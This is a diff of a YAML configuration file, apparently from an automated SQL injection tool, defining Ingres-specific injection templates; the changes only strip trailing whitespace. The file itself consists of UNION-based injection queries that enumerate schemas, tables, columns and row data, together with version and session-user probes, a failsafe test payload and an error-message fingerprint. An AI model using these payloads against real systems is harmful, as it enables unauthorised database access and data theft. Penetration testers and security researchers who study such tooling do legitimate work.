@@ -1,24 +1,24 @@
 vendor: Ingres
 
-resource: 
+resource:
  info: |
-  SELECT 
+  SELECT
       dbmsinfo('_version')
       || '${enclose_value_sql}'
       || dbmsinfo('database')
       || '${enclose_value_sql}'
       || dbmsinfo('session_user')
-      || ${trail_hex} 
+      || ${trail_hex}
       r
-      
- schema: 
+
+ schema:
   database: |
-   select 
+   select
        rr
-       || ${trail_hex} 
+       || ${trail_hex}
        r
    from (
-       select 
+       select
            ${enclose_value_hex}
            || trim(t.schema_name)
            || '${separator_qte_sql}0${enclose_value_sql}'
@@ -30,14 +30,14 @@ resource:
        group by 1
        ${limit}
    ) a
-   
+
   table: |
-   select 
+   select
        rr
-       || ${trail_hex} 
+       || ${trail_hex}
        r
    from (
-       select 
+       select
            ${enclose_value_hex}
            || trim(t.table_name)
            || '${separator_qte_sql}0${enclose_value_sql}'
@@ -49,14 +49,14 @@ resource:
        group by 1
        ${limit}
    ) a
-   
+
   column: |
-   select 
+   select
        rr
-       || ${trail_hex} 
+       || ${trail_hex}
        r
    from (
-       select 
+       select
            ${enclose_value_hex}
            || trim(t.column_name)
            || '${separator_qte_sql}0${enclose_value_sql}'
@@ -68,15 +68,15 @@ resource:
        group by 1
        ${limit}
    ) a
-   
-  row: 
+
+  row:
    query: |
-    select 
+    select
         rr
-        ||${trail_hex} 
+        ||${trail_hex}
         r
     from (
-        select 
+        select
             ${enclose_value_hex}
             || trim(t.s)
             || '${separator_qte_sql}0${enclose_value_sql}'
@@ -88,12 +88,12 @@ resource:
         group by 1
         ${limit}
     ) a
-   fields: 
+   fields:
     field: trim(ifnull(varchar(${field.value}), ''))"
     concat: "|| 0x7f ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
    '${lead}'
    ||substr(
@@ -108,16 +108,16 @@ strategy:
   failsafe: select 1337${indice}7330%2b1 r
   calibrator: |
    rpad(
-       '${calibrator_sql}', 
-       1024, 
+       '${calibrator_sql}',
+       1024,
        '${calibrator_sql}'
    )
   limitBoundary: 1
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - Non-terminated string
-    
- normal: 
+
+ normal:
   indices: union select ${result_range} from (${indice_unique})b
   capacity: "'${lead}${indice}' || ${calibrator}"
   orderBy: order by 1337
